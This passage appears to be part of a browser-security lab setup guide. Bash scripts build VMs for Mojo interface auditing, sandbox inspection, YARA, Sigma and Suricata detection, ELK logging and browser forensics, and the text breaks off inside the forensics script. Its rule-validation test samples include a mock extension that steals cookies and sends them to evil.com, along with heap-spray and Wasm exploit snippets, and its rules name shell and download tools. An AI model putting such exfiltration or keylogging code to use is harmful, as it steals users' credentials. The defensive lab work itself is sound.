        privileged_operations=["Web Locks API"],
        risk_level="LOW"
    ),
    MojoInterface(
        name="blink::mojom::PermissionService",
        mojom_path="third_party/blink/public/mojom/permissions/permission.mojom",
        available_to="web_content",
        privileged_operations=["Query/request permissions"],
        risk_level="MEDIUM",
        notes="Race condition risk: check-then-act pattern"
    ),
    MojoInterface(
        name="blink::mojom::WebUsbService",
        mojom_path="third_party/blink/public/mojom/usb/web_usb_service.mojom",
        available_to="web_content",
        privileged_operations=["USB device access"],
        risk_level="HIGH",
        notes="Direct hardware access. Requires permission but may reach kernel drivers."
    ),
    MojoInterface(
        name="blink::mojom::WebBluetoothService",
        mojom_path="third_party/blink/public/mojom/bluetooth/web_bluetooth.mojom",
        available_to="web_content",
        privileged_operations=["Bluetooth device access"],
        risk_level="HIGH",
        notes="Direct hardware access via BlueZ/WinRT."
    ),
    MojoInterface(
        name="content::mojom::RendererHost",
        mojom_path="content/common/renderer_host.mojom",
        available_to="web_content",
        privileged_operations=["Renderer lifecycle management"],
        risk_level="MEDIUM"
    ),
]

def audit_interface(iface: MojoInterface) -> dict:
    """Produce an audit report for a single Mojo interface."""
    return {
        "interface": iface.name,
        "mojom_path": iface.mojom_path,
        "available_to": iface.available_to,
        "risk_level": iface.risk_level,
        "privileged_operations": iface.privileged_operations,
        "notes": iface.notes,
        "audit_checks": [
            "[ ] All size/length parameters bounds-checked",
            "[ ] No assumption about message ordering",
            "[ ] No assumption about message timing",
            "[ ] Permission checks are atomic with action",
            "[ ] No shared mutable state between handlers",
            "[ ] Type tags validated for union parameters",
            "[ ] Handles from renderer validated before use",
        ]
    }

def generate_audit_report() -> str:
    """Generate full Mojo interface audit report."""
    report = {
        "title": "Mojo Interface Sandbox Escape Audit",
        "methodology": {
            "step_1": "Map attack surface: enumerate all interfaces in BrowserInterfaceBrokerImpl",
            "step_2": "Identify privileged operations per reachable interface",
            "step_3": "Input validation audit (size, types, ordering, timing)",
            "step_4": "Race condition review (check-then-act patterns)",
            "step_5": "Fuzz with mojo_fuzzer_* targets",
        },
        "high_risk_interfaces": [
            audit_interface(i) for i in KNOWN_INTERFACES if i.risk_level == "HIGH"
        ],
        "medium_risk_interfaces": [
            audit_interface(i) for i in KNOWN_INTERFACES if i.risk_level == "MEDIUM"
        ],
        "low_risk_interfaces": [
            audit_interface(i) for i in KNOWN_INTERFACES if i.risk_level == "LOW"
        ],
        "historical_cves": [
            {"cve": "CVE-2019-13768", "interface": "FileSystemManager", "type": "Logic bug (path validation)", "impact": "Sandbox escape"},
            {"cve": "CVE-2020-6418 chain", "interface": "Undisclosed Mojo interface", "type": "Undisclosed", "impact": "Sandbox escape"},
            {"cve": "CVE-2021-21220", "interface": "Undisclosed Mojo interface", "type": "Handle validation", "impact": "Sandbox escape (Pwn2Own 2021)"},
            {"cve": "Issue 1062091", "interface": "BlobRegistry", "type": "Origin spoofing", "impact": "Cross-origin data access"},
        ]
    }
    return json.dumps(report, indent=2)

if __name__ == '__main__':
    print(generate_audit_report())
MOJO_AUDIT
chmod +x /opt/mojo_audit.py

# === Browser sandbox analysis script ===
cat > /opt/sandbox_analyzer.sh << 'SANDBOX_ANALYZE'
#!/bin/bash
# Browser sandbox analysis — inspects running browser process sandboxing

echo "=== Chrome Sandbox Analysis ==="

# Find Chrome renderer processes
echo -e "\n--- Chrome Renderer Processes ---"
ps aux | grep 'chrome.*--type=renderer' | grep -v grep | head -5

RENDERER_PID=$(ps aux | grep 'chrome.*--type=renderer' | grep -v grep | head -1 | awk '{print $2}')

if [ -n "$RENDERER_PID" ]; then
  echo -e "\n--- Namespace Analysis (PID: $RENDERER_PID) ---"
  ls -la /proc/$RENDERER_PID/ns/ 2>/dev/null

  echo -e "\n--- Seccomp Status ---"
  grep -i seccomp /proc/$RENDERER_PID/status 2>/dev/null

  echo -e "\n--- No New Privs ---"
  grep NoNewPrivs /proc/$RENDERER_PID/status 2>/dev/null

  echo -e "\n--- Capabilities ---"
  grep -i cap /proc/$RENDERER_PID/status 2>/dev/null

  echo -e "\n--- Open File Descriptors (first 20) ---"
  ls -la /proc/$RENDERER_PID/fd/ 2>/dev/null | head -20

  echo -e "\n--- Memory Mappings (first 30) ---"
  head -30 /proc/$RENDERER_PID/maps 2>/dev/null

  echo -e "\n--- Syscall Filter (seccomp-bpf) ---"
  # Dump seccomp filter if available
  if [ -f /proc/$RENDERER_PID/seccomp_filter ]; then
    hexdump -C /proc/$RENDERER_PID/seccomp_filter | head -20
  else
    echo "seccomp filter not directly readable (normal — use strace)"
  fi

  echo -e "\n--- Network Namespace ---"
  nsenter -t $RENDERER_PID -n ip addr 2>/dev/null || echo "Cannot enter network namespace (expected for sandboxed process)"

  echo -e "\n--- Allowed Syscalls Test (via strace sample) ---"
  timeout 2 strace -f -p $RENDERER_PID -c 2>/tmp/strace_out &
  sleep 2
  wait
  head -30 /tmp/strace_out 2>/dev/null
fi

echo -e "\n--- Chrome Process Tree ---"
pstree -p $(pgrep -f 'chrome.*--type=zygote' | head -1) 2>/dev/null | head -20

echo -e "\n--- GPU Process Sandbox ---"
GPU_PID=$(ps aux | grep 'chrome.*--type=gpu-process' | grep -v grep | head -1 | awk '{print $2}')
if [ -n "$GPU_PID" ]; then
  echo "GPU PID: $GPU_PID"
  grep -i seccomp /proc/$GPU_PID/status 2>/dev/null
  grep NoNewPrivs /proc/$GPU_PID/status 2>/dev/null
fi

echo -e "\n=== Firefox Sandbox Analysis ==="
FF_PID=$(ps aux | grep 'firefox.*-contentproc' | grep -v grep | head -1 | awk '{print $2}')
if [ -n "$FF_PID" ]; then
  echo "Firefox content PID: $FF_PID"
  grep -i seccomp /proc/$FF_PID/status 2>/dev/null
  grep NoNewPrivs /proc/$FF_PID/status 2>/dev/null
  ls -la /proc/$FF_PID/ns/ 2>/dev/null
fi

echo -e "\n=== Done ==="
SANDBOX_ANALYZE
chmod +x /opt/sandbox_analyzer.sh

echo "[VM2] Attacker/analysis workstation setup complete."
```

### VM3 — Detection & Monitoring (10.8.1.30)

```bash
#!/usr/bin/env bash
# vm3_detection_setup.sh — Detection engineering for browser exploitation
set -euo pipefail

export DEBIAN_FRONTEND=noninteractive

apt-get update && apt-get install -y \
  docker.io docker-compose-v2 \
  yara libyara-dev \
  suricata \
  jq python3 python3-pip

pip3 install --break-system-packages sigma-cli pySigma yara-python elasticsearch

# === YARA Rules for Browser Exploitation ===
mkdir -p /opt/detection/yara

cat > /opt/detection/yara/browser_exploit_shellcode.yar << 'YARA1'
rule Browser_Exploit_Shellcode_Indicators
{
    meta:
        description = "Detects shellcode patterns common in browser exploit payloads"
        author      = "Security Lab"
        date        = "2026-05-18"
        severity    = "CRITICAL"
        reference   = "Chapter 8C §16"

    strings:
        $syscall_execve = { 48 31 f6 56 48 bf 2f 62 69 6e 2f 73 68 00 }
        $virtualalloc   = { 48 89 ?? 48 c7 c1 00 10 00 00 48 c7 c2 00 40 00 00 }
        $mprotect_setup = { b8 0a 00 00 00 48 89 ?? 48 c7 c2 07 00 00 00 0f 05 }
        $wasm_magic_nop = { 00 61 73 6d 01 00 00 00 [0-64] 90 90 90 90 }
        $jit_spray      = { 25 ?? ?? ?? ?? 25 ?? ?? ?? ?? 25 ?? ?? ?? ?? }

    condition:
        any of them
}
YARA1

cat > /opt/detection/yara/wasm_rwx_exploitation.yar << 'YARA2'
rule Wasm_RWX_Exploitation_Pattern
{
    meta:
        description = "Detects artifacts of Wasm JIT page exploitation in memory dumps"
        author      = "Security Lab"
        date        = "2026-05-18"
        severity    = "HIGH"

    strings:
        $wasm_inst     = "WebAssembly.Instance" ascii wide
        $wasm_module   = "WebAssembly.Module" ascii wide
        $f64_array     = "Float64Array" ascii wide
        $bi64_array    = "BigInt64Array" ascii wide
        $dataview      = "DataView" ascii wide
        $addr_conv     = /u64\[0\]\s*=\s*/ ascii
        $hex_offset    = /0x[0-9a-f]{6,8}n/ ascii

    condition:
        $wasm_inst and $wasm_module and
        ($f64_array or $bi64_array) and
        $dataview and
        ($addr_conv or $hex_offset)
}
YARA2

cat > /opt/detection/yara/v8_heap_spray.yar << 'YARA3'
rule V8_Heap_Spray_Artifacts
{
    meta:
        description = "Detects JavaScript heap spray patterns targeting V8"
        author      = "Security Lab"
        date        = "2026-05-18"
        severity    = "HIGH"

    strings:
        $ab_spray    = /new ArrayBuffer\(0x[0-9a-f]+\)/ ascii
        $arr_alloc   = /new Array\((0x[0-9a-f]{4,}|[0-9]{4,})\)/ ascii
        $spray_loop  = /for\s*\(\s*(?:var|let|const)\s+\w+\s*=\s*0\s*;\s*\w+\s*<\s*(?:0x[0-9a-f]+|[0-9]{3,})\s*;/ ascii
        $struct_clone = "structuredClone" ascii
        $gc_trigger  = /(?:gc|collectGarbage)\s*\(\s*\)/ ascii
        $fill_pattern = /\.fill\(0x[0-9a-f]+\)/ ascii

    condition:
        ($ab_spray and $spray_loop) or
        ($arr_alloc and $spray_loop and ($fill_pattern or $gc_trigger)) or
        ($struct_clone and $spray_loop and $ab_spray)
}
YARA3

cat > /opt/detection/yara/xs_leak_toolkit.yar << 'YARA4'
rule XS_Leak_Toolkit
{
    meta:
        description = "Detects JavaScript patterns common in XS-Leak exploitation"
        author      = "Security Lab"
        date        = "2026-05-18"
        severity    = "MEDIUM"

    strings:
        $frame_count  = "window.frames.length" ascii
        $perf_now     = "performance.now()" ascii
        $history_len  = "history.length" ascii
        $bc           = "new BroadcastChannel" ascii
        $img_error    = /new Image\(\)[\s\S]{0,50}\.onerror/
        $fetch_opaque = /fetch\(.*{.*mode:\s*['"]no-cors['"]/
        $timing_loop  = /for\s*\(.*performance\.now/

    condition:
        3 of them
}
YARA4

cat > /opt/detection/yara/forcedentry_jbig2.yar << 'YARA5'
rule FORCEDENTRY_JBIG2_Exploit
{
    meta:
        description = "Detects JBIG2-based exploit patterns similar to FORCEDENTRY"
        author      = "Security Lab"
        date        = "2026-05-18"
        severity    = "CRITICAL"

    strings:
        $pdf_header       = "%PDF-"
        $jbig2_stream     = "/Filter /JBIG2Decode"
        $large_jbig2      = /\/JBIG2Globals\s+\d+\s+0\s+R/
        $suspicious_size  = /\/Length\s+(1[0-9]{5,}|[2-9][0-9]{5,})/

    condition:
        $pdf_header at 0 and $jbig2_stream and $large_jbig2 and $suspicious_size
}
YARA5

cat > /opt/detection/yara/malicious_extension.yar << 'YARA6'
rule Malicious_Browser_Extension_Indicators
{
    meta:
        description = "Detects patterns indicating a malicious browser extension"
        author      = "Security Lab"
        date        = "2026-05-18"
        severity    = "HIGH"

    strings:
        $eval_atob       = /eval\s*\(\s*atob\s*\(/ ascii
        $function_ctor   = /new\s+Function\s*\(/ ascii
        $keylog          = /addEventListener\s*\(\s*['"]key(down|up|press)['"]/ ascii
        $cookie_steal    = /chrome\.cookies\.getAll/ ascii
        $webrequest      = "webRequestBlocking" ascii
        $all_urls        = "<all_urls>" ascii
        $native_msg      = "nativeMessaging" ascii
        $import_scripts  = /importScripts\s*\(\s*['"]https?:\/\// ascii
        $exfil_beacon    = /navigator\.sendBeacon\s*\(\s*['"]https?:\/\// ascii
        $doc_cookie      = /document\.cookie/ ascii

    condition:
        ($eval_atob or $function_ctor) and ($cookie_steal or $doc_cookie or $keylog) or
        ($webrequest and $all_urls and ($cookie_steal or $keylog)) or
        ($native_msg and ($eval_atob or $function_ctor)) or
        ($import_scripts and $exfil_beacon)
}
YARA6

# === Sigma Rules ===
mkdir -p /opt/detection/sigma

cat > /opt/detection/sigma/browser_crash_exploitation.yml << 'SIGMA1'
title: Suspicious Browser Crash Pattern Indicating Exploitation Attempt
id: b7e3a8f1-4c2d-4e9a-b5f1-8d3c7a2e9f01
status: experimental
description: >
    Detects browser processes crashing with signals (SIGSEGV, SIGBUS, SIGABRT)
    repeatedly within a short window, suggesting exploit spray attempts.
date: 2026/05/18
author: Security Lab
logsource:
    category: process_crash
    product: linux
detection:
    selection_process:
        Image|endswith:
            - '/chrome'
            - '/chromium'
            - '/firefox'
            - '/WebKitWebProcess'
    selection_signal:
        - Signal: 'SIGSEGV'
        - Signal: 'SIGBUS'
        - Signal: 'SIGILL'
        - Signal: 'SIGABRT'
    timeframe: 5m
    condition: selection_process and selection_signal | count() by Image > 3
falsepositives:
    - Legitimate browser crashes from buggy extensions
    - GPU driver issues causing repeated crashes
level: high
tags:
    - attack.execution
    - attack.t1203
SIGMA1

cat > /opt/detection/sigma/browser_child_process.yml << 'SIGMA2'
title: Suspicious Child Process Spawned by Browser
id: c9f4b2a1-5d3e-4f1a-a6c2-9e4b8d1f7a03
status: experimental
description: >
    Detects a browser process spawning unexpected child processes,
    indicating successful sandbox escape and post-exploitation.
date: 2026/05/18
author: Security Lab
logsource:
    category: process_creation
    product: linux
detection:
    selection_parent:
        ParentImage|endswith:
            - '/chrome'
            - '/chromium'
            - '/chromium-browser'
            - '/firefox'
    selection_child:
        Image|endswith:
            - '/bash'
            - '/sh'
            - '/dash'
            - '/python3'
            - '/python'
            - '/perl'
            - '/curl'
            - '/wget'
            - '/nc'
            - '/ncat'
    filter_legitimate:
        CommandLine|contains: '--type='
    condition: selection_parent and selection_child and not filter_legitimate
falsepositives:
    - Browser extensions using native messaging hosts
    - Developer debugging configurations
level: critical
tags:
    - attack.execution
    - attack.defense_evasion
    - attack.t1203
    - attack.t1059
SIGMA2

cat > /opt/detection/sigma/browser_sandbox_escape.yml << 'SIGMA3'
title: Browser Sandbox Escape Indicators — Memory Manipulation
id: d8a5c3b2-6e4f-4a2b-b7d3-0f5c9e2a8b04
status: experimental
description: >
    Detects mprotect calls from browser renderer processes to make memory executable,
    or unexpected library loads indicating sandbox escape.
date: 2026/05/18
author: Security Lab
logsource:
    category: process_access
    product: linux
detection:
    selection_renderer:
        SourceImage|endswith:
            - '/chrome'
            - '/chromium'
        SourceCommandLine|contains: '--type=renderer'
    selection_syscall:
        Syscall:
            - 'mprotect'
            - 'mmap'
        Arguments|contains: 'PROT_EXEC'
    condition: selection_renderer and selection_syscall
falsepositives:
    - V8 JIT compilation (normal behavior in non-JIT-less mode)
    - Wasm compilation
level: medium
tags:
    - attack.defense_evasion
    - attack.privilege_escalation
    - attack.t1055
SIGMA3

cat > /opt/detection/sigma/wasm_cryptomining.yml << 'SIGMA4'
title: Browser WebAssembly Cryptomining Indicators
id: 5d2a8f3e-1b7c-4e6d-a9f0-3c8b5d2e1a4f
status: experimental
description: >
    Detects indicators of Wasm-based cryptomining: large Wasm module downloads
    or connections to known mining pool endpoints.
date: 2026/05/18
author: Security Lab
logsource:
    category: proxy
    product: any
detection:
    wasm_download:
        c-uri|endswith:
            - '.wasm'
        cs-bytes|gt: 500000
    mining_pool:
        c-uri|contains:
            - 'stratum+tcp'
            - 'pool.minexmr'
            - 'pool.hashvault'
            - 'xmrpool.eu'
            - 'monerohash.com'
    condition: wasm_download or mining_pool
level: medium
tags:
    - attack.resource_hijacking
    - attack.t1496
SIGMA4

cat > /opt/detection/sigma/renderer_crash_then_exploit.yml << 'SIGMA5'
title: Chrome Renderer Crash Followed by Suspicious Activity
id: 8c4e2f1a-3d7b-4a9e-b5c1-2f8d6e4a7b3c
status: experimental
description: >
    Detects Pwn2Own-style exploit chains: renderer crash followed by
    browser process spawning unexpected child processes.
date: 2026/05/18
author: Security Lab
logsource:
    category: process_creation
    product: linux
detection:
    renderer_crash:
        ParentImage|endswith: '/chrome'
        CommandLine|contains: '--type=renderer'
    suspicious_child:
        ParentImage|endswith: '/chrome'
        Image|endswith:
            - '/bash'
            - '/sh'
            - '/python3'
            - '/curl'
    condition: renderer_crash or suspicious_child
level: high
tags:
    - attack.execution
    - attack.t1203
SIGMA5

# === Suricata Rules ===
mkdir -p /opt/detection/suricata

cat > /opt/detection/suricata/browser_exploit.rules << 'SURICATA1'
# Exploit kit landing page detection — obfuscated JS
alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"EXPLOIT_KIT Landing - Obfuscated JS Redirect";
    flow:established,to_client;
    content:"text/html"; http_header;
    content:"eval("; content:"String.fromCharCode"; distance:0; within:200;
    pcre:"/eval\s*\(\s*(?:unescape|decodeURIComponent|String\.fromCharCode|atob)\s*\(/";
    classtype:exploit-kit; sid:2030001; rev:1;
)

# Suspicious Wasm module delivery
alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"EXPLOIT Suspicious Wasm Module Delivery";
    flow:established,to_client;
    content:"|00 61 73 6d|"; offset:0; depth:4;
    content:"application/wasm"; http_header;
    classtype:exploit-kit; sid:2030002; rev:1;
)

# Post-exploitation PE payload via browser download
alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"EXPLOIT Post-Exploitation PE Payload via Browser";
    flow:established,to_client;
    content:"application/octet-stream"; http_header;
    content:"|4d 5a|"; offset:0; depth:2;
    classtype:trojan-activity; sid:2030003; rev:1;
)

# Post-exploitation beacon after browser content process crash
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"ET EXPLOIT Post-exploitation beacon after browser crash";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"Mozilla/5.0"; http_header;
    pcre:"/^[A-Za-z0-9+\/]{100,}={0,2}$/P";
    threshold:type threshold, track by_src, count 5, seconds 60;
    classtype:trojan-activity; sid:2030004; rev:1;
)

# WebGPU shader compilation abuse
alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"EXPLOIT WebGPU Shader Payload Delivery";
    flow:established,to_client;
    content:"text/wgsl"; http_header;
    content:"@compute"; content:"@workgroup_size";
    classtype:attempted-admin; sid:2030005; rev:1;
)

# Speculation Rules abuse — excessive prerender
alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"SUSPICIOUS Excessive Speculation Rules Prerender";
    flow:established,to_client;
    content:"speculationrules"; http_client_body;
    content:"prerender"; http_client_body;
    pcre:"/\"prerender\"\s*:\s*\[[\s\S]{500,}/P";
    classtype:attempted-recon; sid:2030006; rev:1;
)
SURICATA1

# Load Suricata rules
cp /opt/detection/suricata/browser_exploit.rules /etc/suricata/rules/
echo 'include: browser_exploit.rules' >> /etc/suricata/suricata.yaml 2>/dev/null || true

# === ELK Stack (Docker) ===
mkdir -p /opt/elk
cat > /opt/elk/docker-compose.yml << 'ELK'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.12.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - ES_JAVA_OPTS=-Xms512m -Xmx512m
    ports:
      - "9200:9200"
    volumes:
      - esdata:/usr/share/elasticsearch/data
  kibana:
    image: docker.elastic.co/kibana/kibana:8.12.0
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    ports:
      - "5601:5601"
    depends_on:
      - elasticsearch
  logstash:
    image: docker.elastic.co/logstash/logstash:8.12.0
    ports:
      - "5044:5044"
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
    depends_on:
      - elasticsearch
volumes:
  esdata:
ELK

cat > /opt/elk/logstash.conf << 'LOGSTASH'
input {
  beats { port => 5044 }
  file {
    path => "/var/log/suricata/eve.json"
    codec => json
    type => "suricata"
  }
}

filter {
  if [type] == "suricata" {
    if [event_type] == "alert" {
      mutate { add_tag => ["suricata_alert"] }
    }
  }
}

output {
  elasticsearch {
    hosts => ["http://elasticsearch:9200"]
    index => "browser-security-%{+YYYY.MM.dd}"
  }
}
LOGSTASH

cd /opt/elk && docker compose up -d 2>/dev/null || true

# === Detection validation script ===
cat > /opt/detection/validate_rules.sh << 'VALIDATE'
#!/bin/bash
echo "=== Browser Exploitation Detection Rule Validation ==="

echo -e "\n--- YARA Rule Compilation ---"
for rule in /opt/detection/yara/*.yar; do
  if yara -C "$rule" /dev/null 2>/dev/null; then
    echo "  [PASS] $(basename $rule)"
  else
    echo "  [FAIL] $(basename $rule)"
    yara -C "$rule" /dev/null
  fi
done

echo -e "\n--- YARA Test: V8 Exploit Artifacts ---"
# Create test samples
mkdir -p /tmp/yara-test

# V8 heap spray sample
cat > /tmp/yara-test/heap_spray.js << 'SAMPLE'
var spray = [];
for (var i = 0; i < 0x1000; i++) {
  spray.push(new ArrayBuffer(0x100));
}
gc();
var arr = new Array(0x10000);
arr.fill(0x41414141);
structuredClone(spray[0]);
SAMPLE

yara /opt/detection/yara/v8_heap_spray.yar /tmp/yara-test/heap_spray.js && \
  echo "  [PASS] Heap spray detection" || echo "  [FAIL] Heap spray detection"

# Wasm exploitation sample
cat > /tmp/yara-test/wasm_exploit.js << 'SAMPLE2'
var mod = new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0]));
var inst = new WebAssembly.Instance(mod);
var f64 = new Float64Array(new ArrayBuffer(8));
var bi64 = new BigInt64Array(f64.buffer);
var dv = new DataView(new ArrayBuffer(256));
u64[0] = 0x12345678n;
SAMPLE2

yara /opt/detection/yara/wasm_rwx_exploitation.yar /tmp/yara-test/wasm_exploit.js && \
  echo "  [PASS] Wasm exploitation detection" || echo "  [FAIL] Wasm exploitation detection"

# XS-Leak sample
cat > /tmp/yara-test/xsleak.js << 'SAMPLE3'
var t1 = performance.now();
var fc = window.frames.length;
var hl = history.length;
var bc = new BroadcastChannel('test');
fetch('/api', {mode: 'no-cors'});
for (var i = 0; i < 100; i++) { performance.now(); }
SAMPLE3

yara /opt/detection/yara/xs_leak_toolkit.yar /tmp/yara-test/xsleak.js && \
  echo "  [PASS] XS-Leak detection" || echo "  [FAIL] XS-Leak detection"

# Malicious extension sample
cat > /tmp/yara-test/evil_ext.js << 'SAMPLE4'
eval(atob("Y29uc29sZS5sb2coZG9jdW1lbnQuY29va2llKQ=="));
chrome.cookies.getAll({}, function(cookies) {
  navigator.sendBeacon("https://evil.com/steal", JSON.stringify(cookies));
});
document.addEventListener('keydown', function(e) { log(e.key); });
SAMPLE4

yara /opt/detection/yara/malicious_extension.yar /tmp/yara-test/evil_ext.js && \
  echo "  [PASS] Malicious extension detection" || echo "  [FAIL] Malicious extension detection"

echo -e "\n--- Sigma Rule Syntax Check ---"
for rule in /opt/detection/sigma/*.yml; do
  python3 -c "import yaml; yaml.safe_load(open('$rule'))" 2>/dev/null && \
    echo "  [PASS] $(basename $rule)" || echo "  [FAIL] $(basename $rule)"
done

echo -e "\n--- Suricata Rule Syntax Check ---"
suricata -T -c /etc/suricata/suricata.yaml 2>/dev/null && \
  echo "  [PASS] Suricata rules valid" || echo "  [WARN] Suricata config check"

rm -rf /tmp/yara-test
echo -e "\n=== Validation Complete ==="
VALIDATE
chmod +x /opt/detection/validate_rules.sh

echo "[VM3] Detection host setup complete."
```

### VM4 — Browser Forensics Workstation (10.8.1.40)

```bash
#!/usr/bin/env bash
# vm4_forensics_setup.sh — Browser forensics analysis tools
set -euo pipefail

export DEBIAN_FRONTEND=noninteractive

apt-get update && apt-get install -y \
  python3 python3-pip sqlite3 jq \
  gdb binutils file strings \
  foremost bulk-extractor \
  yara libyara-dev lz4

pip3 install --break-system-packages \
  volatility3 yara-python lz4

# === Browser forensics toolkit ===
mkdir -p /opt/forensics

cat > /opt/forensics/browser_forensics.py << 'FORENSICS'
#!/usr/bin/env python3
"""
Browser Forensics Toolkit

Analyzes Chrome and Firefox artifacts: history, cookies, cache,
extensions, ServiceWorkers, crash dumps. Produces structured
forensics reports for incident response.
"""

import sqlite3
import json
import os
import glob
import hashlib
import struct
from datetime import datetime, timezone
from dataclasses import dataclass, field
from typing import Optional
from pathlib import Path

# === Chrome Timestamp Conversion ===
CHROME_EPOCH_OFFSET = 11644473600  # seconds between 1601-01-01 and 1970-01-01

def chrome_time_to_datetime(chrome_time: int) -> Optional[datetime]:
    """Convert Chrome timestamp (microseconds since 1601-01-01) to datetime."""
    if chrome_time == 0:
        return None
    unix_ts = chrome_time / 1_000_000 - CHROME_EPOCH_OFFSET
    try:
        return datetime.fromtimestamp(unix_ts, tz=timezone.utc)
    except (ValueError, OSError):
        return None

# === Chrome History Analysis ===

def analyze_chrome_history(profile_path: str, hours: int = 24) -> list:
    """Extract recent browsing history from Chrome's History SQLite database."""
    db_path = os.path.join(profile_path, "History")
    if not os.path.exists(db_path):
        return [{"error": f"History database not found at {db_path}"}]

    conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
    cursor = conn.cursor()

    cursor.execute("""
        SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch') as visit_time,
               url, title, visit_count, typed_count
        FROM urls
        WHERE last_visit_time > 0
        ORDER BY last_visit_time DESC
        LIMIT 500
    """)

    results = []
    for row in cursor.fetchall():
        results.append({
            "visit_time": row[0],
            "url": row[1],
            "title": row[2],
            "visit_count": row[3],
            "typed_count": row[4],
            "suspicious": any(kw in (row[1] or '').lower() for kw in
                            ['exploit', 'payload', 'shell', 'malware', 'c2', '0day'])
        })

    conn.close()
    return results

# === Chrome Downloads Analysis ===

def analyze_chrome_downloads(profile_path: str) -> list:
    """Extract download records, highlighting dangerous downloads."""
    db_path = os.path.join(profile_path, "History")
    if not os.path.exists(db_path):
        return []

    conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
    cursor = conn.cursor()

    danger_types = {
        0: "NOT_DANGEROUS",
        1: "DANGEROUS_FILE",
        2: "DANGEROUS_URL",
        3: "DANGEROUS_CONTENT",
        4: "MAYBE_DANGEROUS_CONTENT",
        5: "UNCOMMON_CONTENT",
        6: "USER_VALIDATED",
        7: "DANGEROUS_HOST",
        8: "POTENTIALLY_UNWANTED",
        9: "ALLOWLISTED_BY_POLICY",
    }

    cursor.execute("""
        SELECT datetime(start_time/1000000-11644473600,'unixepoch') as start,
               target_path, tab_url, total_bytes, mime_type, danger_type, state
        FROM downloads
        ORDER BY start_time DESC
        LIMIT 200
    """)

    results = []
    for row in cursor.fetchall():
        results.append({
            "start_time": row[0],
            "target_path": row[1],
            "source_url": row[2],
            "total_bytes": row[3],
            "mime_type": row[4],
            "danger_type": danger_types.get(row[5], f"UNKNOWN({row[5]})"),
            "dangerous": row[5] > 0
        })

    conn.close()
    return results

# === Cookie Security Audit ===

def audit_chrome_cookies(profile_path: str) -> list:
    """Audit cookies for missing security attributes."""
    db_path = os.path.join(profile_path, "Cookies")
    if not os.path.exists(db_path):
        return [{"error": "Cookies database not found"}]

    conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
    cursor = conn.cursor()

    try:
        cursor.execute("""
            SELECT host_key, name, path, is_secure, is_httponly,
                   samesite, is_persistent, has_expires,
                   datetime(expires_utc/1000000-11644473600,'unixepoch') as expires
            FROM cookies
            ORDER BY host_key
        """)
    except sqlite3.OperationalError:
        cursor.execute("""
            SELECT host_key, name, path, is_secure, is_httponly,
                   samesite, is_persistent, has_expires, ''
            FROM cookies
            ORDER BY host_key
        """)

    samesite_map = {-1: "UNSPECIFIED", 0: "NO_RESTRICTION", 1: "LAX", 2: "STRICT"}

    results = []
    for row in cursor.fetchall():
        issues = []
        if not row[3]:
            issues.append("MISSING_SECURE")
        if not row[4]:
            issues.append("MISSING_HTTPONLY")
        if row[5] == -1 or row[5] == 0:
            issues.append("WEAK_SAMESITE")
        if row[0].startswith('.') and row[0].count('.') <= 1:
            issues.append("OVERLY_BROAD_DOMAIN")

        results.append({
            "domain": row[0],
            "name": row[1],
            "path": row[2],
            "secure": bool(row[3]),
            "httponly": bool(row[4]),
            "samesite": samesite_map.get(row[5], f"UNKNOWN({row[5]})"),
            "persistent": bool(row[6]),
            "expires": row[8] if row[7] else "session",
            "issues": issues,
            "risk": "HIGH" if len(issues) >= 2 else ("MEDIUM" if issues else "LOW")
        })

    conn.close()
    return results

# === Extension Forensics ===

def analyze_chrome_extensions(profile_path: str) -> list:
    """Analyze installed extensions for suspicious indicators."""
    ext_dir = os.path.join(profile_path, "Extensions")
    if not os.path.isdir(ext_dir):
        return [{"error": "Extensions directory not found"}]

    results = []
    for ext_id in os.listdir(ext_dir):
        ext_path = os.path.join(ext_dir, ext_id)
        if not os.path.isdir(ext_path):
            continue

        # Find the latest version's manifest
        versions = sorted(os.listdir(ext_path))
        if not versions:
            continue

        manifest_path = os.path.join(ext_path, versions[-1], "manifest.json")
        if not os.path.exists(manifest_path):
            continue

        try:
            with open(manifest_path) as f:
                manifest = json.load(f)
        except (json.JSONDecodeError, IOError):
            continue

        name = manifest.get("name", "UNKNOWN")
        perms = manifest.get("permissions", [])
        host_perms = manifest.get("host_permissions", [])
        content_scripts = manifest.get("content_scripts", [])
        background = manifest.get("background", {})
        mv = manifest.get("manifest_version", 2)

        # Risk assessment
        risk_indicators = []
        if "<all_urls>" in perms or "<all_urls>" in host_perms:
            risk_indicators.append("ALL_URLS_ACCESS")
        if "webRequestBlocking" in perms:
            risk_indicators.append("WEB_REQUEST_BLOCKING")
        if "cookies" in perms:
            risk_indicators.append("COOKIE_ACCESS")
        if "nativeMessaging" in perms:
            risk_indicators.append("NATIVE_MESSAGING")
        if "tabs" in perms and "cookies" in perms:
            risk_indicators.append("TABS_AND_COOKIES")

        # Check for obfuscated code in background scripts
        bg_scripts = []
        if "service_worker" in background:
            bg_scripts.append(background["service_worker"])
        elif "scripts" in background:
            bg_scripts.extend(background["scripts"])

        obfuscation_detected = False
        for script_name in bg_scripts:
            script_path = os.path.join(ext_path, versions[-1], script_name)
            if os.path.exists(script_path):
                with open(script_path, 'r', errors='ignore') as f:
                    code = f.read()
                if 'eval(atob' in code or 'Function(' in code or 'eval(unescape' in code:
                    obfuscation_detected = True
                    risk_indicators.append("OBFUSCATED_CODE")

        risk_level = "CRITICAL" if len(risk_indicators) >= 3 else \
                     "HIGH" if len(risk_indicators) >= 2 else \
                     "MEDIUM" if risk_indicators else "LOW"

        results.append({
            "id": ext_id,
            "name": name,
            "version": versions[-1],
            "manifest_version": mv,
            "permissions": perms,
            "host_permissions": host_perms,
            "content_scripts_count": len(content_scripts),
            "risk_indicators": risk_indicators,
